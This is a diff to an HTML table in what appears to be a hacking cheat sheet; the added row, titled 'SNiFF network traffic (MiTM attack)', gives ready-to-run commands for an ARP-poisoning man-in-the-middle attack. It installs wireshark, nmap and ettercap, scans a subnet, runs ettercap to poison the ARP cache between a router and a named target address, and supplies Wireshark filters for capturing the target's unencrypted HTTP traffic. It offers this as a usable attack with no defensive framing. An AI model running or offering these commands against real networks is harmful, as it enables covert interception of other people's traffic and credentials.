@@ -425,6 +425,15 @@ $ python saphyra.py http://10.7.1.50 <br />
 <th>SNiFF network traffic (MiTM attack)</th>
 <td>any device network traffic<br /></td>
 <td>
+use wireshark <br />
+ARP Poisoning with ettercap: (Man in the middle and then wireshark)<br />
+$ apt install wireshark <br />
+$ apt install nmap <br />
+$ apt install ettercap-text-only <br />
+$ sudo nmap -sn 10.0.0.0/24 (start scanning the network for ip addresses of devices) <br />
+$ sudo ettercap -T -S i wlan0 -M arp:remote /10.0.0.1// /10.0.0.129//(S = SSL, 10.0.0.1 is router and 10.0.0.129 is the target, then use wireshark to sniff ) <br />
+In wireshark: ip.addr == 10.0.0.129 <br />
+ip.addr == 10.0.0.129 && http (to filter no SSL cert destination ip from target device)
 
 <br /></td>
 </tr>
